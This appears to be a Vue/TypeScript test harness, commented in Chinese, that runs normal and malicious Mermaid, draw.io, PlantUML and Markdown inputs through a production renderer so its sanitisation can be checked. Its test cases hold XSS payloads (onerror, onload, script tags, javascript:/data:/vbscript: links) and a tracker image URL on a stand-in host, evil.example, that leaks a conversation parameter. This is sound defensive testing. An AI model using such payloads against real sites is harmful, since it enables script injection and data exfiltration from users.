/**
 * 图表渲染的隔离验收入口。
 *
 * 用真实的生产渲染链（useMarkdown → useDiagramRenderer → 各渲染器 → 清理）
 * 处理恶意与正常输入，把结果挂到 #app，供 CDP 检查最终 DOM、脚本执行与网络。
 * 不连接后端、不加载私人内容、不依赖公共 CDN。
 */
import { createApp, h, ref } from 'vue'
import AssistantMessage from '@/components/agent/message/AssistantMessage.vue'
import { useDiagramRenderer } from '@/composables/useDiagramRenderer'
import { useMarkdown } from '@/composables/useMarkdown'

// 受控 PlantUML 地址由构建期环境变量决定（VITE_PLANTUML_SERVER），
// 这里不写死任何主机，用来验证"配置后只联系该目标"。
const PLANTUML_SERVER = (import.meta.env.VITE_PLANTUML_SERVER as string | undefined) ?? ''

// 单独验证渲染器编排：配置了受控服务时，图片地址只能指向该服务
const { renderDiagrams } = useDiagramRenderer({ plantumlServer: PLANTUML_SERVER })
const plantumlOrchestrated = ref('')
void renderDiagrams(
  useMarkdown().render('```plantuml\n@startuml\nAlice -> Bob\n@enduml\n```'),
).then((html) => {
  plantumlOrchestrated.value = html
  // 直接把真实产物挂进 DOM，便于检查最终结构（不经过组件，避免被 Vue 清理）
  const host = document.getElementById('harness-plantuml-orchestrated')
  if (host) host.innerHTML = html
})

// 执行标记：任何 payload 若真的执行了，会在这里留下痕迹
const executed = new Set<string>()
;(window as any).__executed = executed
;(window as any).__mark = (name: string) => executed.add(name)

const CASES: Array<{ id: string; label: string; content: string }> = [
  {
    id: 'normal-mermaid',
    label: '正常 Mermaid 流程图',
    content:
      '```mermaid\nflowchart TD\n  A[开始] --> B{判断}\n  B -->|是| C[执行]\n  B -->|否| D[结束]\n```',
  },
  {
    id: 'normal-mermaid-seq',
    label: '正常 Mermaid 时序图',
    content: '```mermaid\nsequenceDiagram\n  Alice->>Bob: 你好\n  Bob-->>Alice: 收到\n```',
  },
  {
    id: 'normal-drawio',
    label: '正常 draw.io 图表',
    content:
      '```drawio\n<mxGraphModel><root>' +
      '<mxCell id="0"/><mxCell id="1" parent="0"/>' +
      '<mxCell id="2" value="节点 A" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">' +
      '<mxGeometry x="40" y="40" width="100" height="40" as="geometry"/></mxCell>' +
      '<mxCell id="3" value="节点 B" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">' +
      '<mxGeometry x="200" y="40" width="100" height="40" as="geometry"/></mxCell>' +
      '<mxCell id="4" value="" style="endArrow=classic;" edge="1" parent="1" source="2" target="3">' +
      '<mxGeometry relative="1" as="geometry"/></mxCell>' +
      '</root></mxGraphModel>\n```',
  },
  {
    id: 'normal-plantuml',
    label: '正常 PlantUML（未配置自托管 -> 源码）',
    content: '```plantuml\n@startuml\nAlice -> Bob: 请求\nBob --> Alice: 响应\n@enduml\n```',
  },
  {
    id: 'evil-mermaid-script',
    label: '恶意 Mermaid：script 注入',
    content:
      '```mermaid\nflowchart TD\n  A["<img src=x onerror=__mark(\'mermaid-img-onerror\')>"] --> B\n```',
  },
  {
    id: 'evil-mermaid-click',
    label: '恶意 Mermaid：click 回调',
    content:
      '```mermaid\nflowchart TD\n  A[点我] --> B\n  click A callback "__mark(\'mermaid-click\')"\n```',
  },
  {
    id: 'evil-mermaid-link',
    label: '恶意 Mermaid：危险链接',
    content:
      '```mermaid\nflowchart TD\n  A[链接] --> B\n  click A "javascript:__mark(\'mermaid-js-link\')"\n```',
  },
  {
    id: 'evil-markdown-svg',
    label: '恶意 Markdown：内联 SVG 与事件处理器',
    content:
      "<svg onload=\"__mark('md-svg-onload')\"><script>__mark('md-script')</script></svg>\n\n" +
      '<img src=x onerror="__mark(\'md-img-onerror\')">',
  },
  {
    id: 'evil-markdown-link',
    label: '恶意 Markdown：javascript/data 链接',
    content:
      "[js](javascript:__mark('md-js-link'))\n\n[data](data:text/html;base64,PHNjcmlwdD5fX21hcmsoJ21kLWRhdGEnKTwvc2NyaXB0Pg==)\n\n" +
      "[vb](vbscript:__mark('md-vb'))",
  },
  {
    id: 'evil-drawio',
    label: '恶意 draw.io：外部图片与脚本',
    content:
      '```drawio\n<mxGraphModel><root><mxCell id="0"/><mxCell id="1" parent="0"/>' +
      '<mxCell id="2" value="&lt;img src=x onerror=__mark(\'drawio-onerror\')&gt;" ' +
      'style="text;html=1;" vertex="1" parent="1">' +
      '<mxGeometry x="20" y="20" width="160" height="40" as="geometry"/></mxCell>' +
      '</root></mxGraphModel>\n```',
  },
  {
    id: 'evil-plantuml-target',
    label: '恶意 PlantUML：试图改变请求目标',
    content:
      '```plantuml\n@startuml\nnote "https://evil.example/steal" as N\nAlice -> Bob\n@enduml\n```',
  },
  {
    id: 'external-resource',
    label: '外部资源引用：图片与远程样式',
    content: '![外链](https://evil.example/tracker.png?conversation=secret)',
  },
]

const App = {
  setup() {
    return { cases: CASES, chosen: ref('all'), plantumlOrchestrated }
  },
  render() {
    return h('div', { id: 'harness-root' }, [
      h('div', { id: 'harness-plantuml-server', 'data-value': PLANTUML_SERVER }, PLANTUML_SERVER),
      h('div', {
        id: 'harness-plantuml-orchestrated',
        innerHTML: this.plantumlOrchestrated,
      }),
      h(
        'div',
        { id: 'harness-case-list' },
        this.cases.map((c) =>
          h('div', { class: 'harness-case', 'data-case': c.id }, [
            h('h3', c.label),
            h('div', { class: 'harness-output' }, [
              // 每个用例独立挂载，避免相互影响
              h(AssistantMessage, { content: c.content }),
            ]),
          ]),
        ),
      ),
    ])
  },
}

createApp(App).mount('#app')
